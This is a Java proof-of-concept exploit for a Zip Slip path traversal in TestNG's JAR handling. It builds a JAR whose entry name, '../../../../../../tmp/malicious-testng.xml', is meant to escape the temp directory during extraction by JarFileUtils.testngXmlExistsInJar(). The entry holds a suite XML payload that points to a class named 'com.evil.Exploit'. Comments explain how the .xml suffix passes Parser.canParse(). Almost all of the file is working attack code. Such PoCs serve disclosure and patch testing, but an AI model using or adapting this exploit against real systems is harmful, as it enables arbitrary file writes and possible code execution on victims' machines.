// Create malicious JAR with traversal path entry
import java.util.zip.*;
import java.io.*;

public class ExploitZipSlip {
  public static void main(String[] args) throws Exception {
    // Create a malicious JAR that writes to /etc/testng.xml (or similar)
    FileOutputStream fos = new FileOutputStream("malicious.jar");
    JarOutputStream jos = new JarOutputStream(fos);

    // Entry with traversal sequence that passes Parser.canParse() check
    // (ends in .xml so accepted) but escapes the temp directory
    String maliciousEntry = "../../../../../../tmp/malicious-testng.xml";
    jos.putNextEntry(new ZipEntry(maliciousEntry));
    // Write malicious XML content
    String payload = "<suite name='pwned'><test name='t'><classes><class name='com.evil.Exploit'/></classes></test></suite>";
    jos.write(payload.getBytes());
    jos.closeEntry();
    jos.close();

    // Then invoke TestNG with this JAR:
    // java -jar malicious.jar
    // TestNG's JarFileUtils.testngXmlExistsInJar() will extract the entry
    // to: tempDir/../../../../../../tmp/malicious-testng.xml
    // = /tmp/malicious-testng.xml (outside tempDir)
  }
}

